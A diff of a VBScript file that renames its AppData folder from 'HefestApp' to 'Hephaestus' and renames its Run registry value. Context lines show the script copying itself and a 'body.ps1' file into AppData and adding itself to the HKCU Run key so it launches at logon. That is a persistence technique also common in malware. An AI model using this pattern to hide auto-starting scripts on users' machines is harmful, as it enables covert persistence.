@@ -66,7 +66,7 @@ Function GetPS1FilePath()
     Set fso = CreateObject("Scripting.FileSystemObject")
     Set shell = CreateObject("WScript.Shell")
     scriptPath = WScript.ScriptFullName
-    destFolder = fso.BuildPath(shell.ExpandEnvironmentStrings("%APPDATA%"), "HefestApp")
+    destFolder = fso.BuildPath(shell.ExpandEnvironmentStrings("%APPDATA%"), "Hephaestus")
     destPath = fso.BuildPath(destFolder, "body.ps1")
     CreateFolder fso, destFolder
     GetPS1FilePath = destPath   
@@ -77,7 +77,7 @@ Function GetSelfFilePath()
     Set fso = CreateObject("Scripting.FileSystemObject")
     Set shell = CreateObject("WScript.Shell")
     scriptPath = WScript.ScriptFullName
-    destFolder = fso.BuildPath(shell.ExpandEnvironmentStrings("%APPDATA%"), "HefestApp")
+    destFolder = fso.BuildPath(shell.ExpandEnvironmentStrings("%APPDATA%"), "Hephaestus")
     destPath = fso.BuildPath(destFolder, "holder.vbs")
     CreateFolder fso, destFolder
     GetSelfFilePath = destPath
@@ -133,7 +133,7 @@ Sub DoSetAutoStart()
     CopyScript fso, WScript.ScriptFullName, GetSelfFilePath
 
     registryKey = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\"
-    registryValue = "HefestAppVbs"
+    registryValue = "Hephaestus"
     command = "wscript.exe """ & GetSelfFilePath & """ autostart"
     shell.RegWrite registryKey & registryValue, command, "REG_SZ"
 
@@ -218,7 +218,7 @@ Function GetFilePath(fileName)
     Set fso = CreateObject("Scripting.FileSystemObject")
     Set shell = CreateObject("WScript.Shell")
     scriptPath = WScript.ScriptFullName
-    scriptFolder = fso.BuildPath(shell.ExpandEnvironmentStrings("%APPDATA%"), "HefestApp")
+    scriptFolder = fso.BuildPath(shell.ExpandEnvironmentStrings("%APPDATA%"), "Hephaestus")
     fullPath = fso.BuildPath(scriptFolder, fileName)
     CreateFolder fso, scriptFolder
     Set fso = Nothing
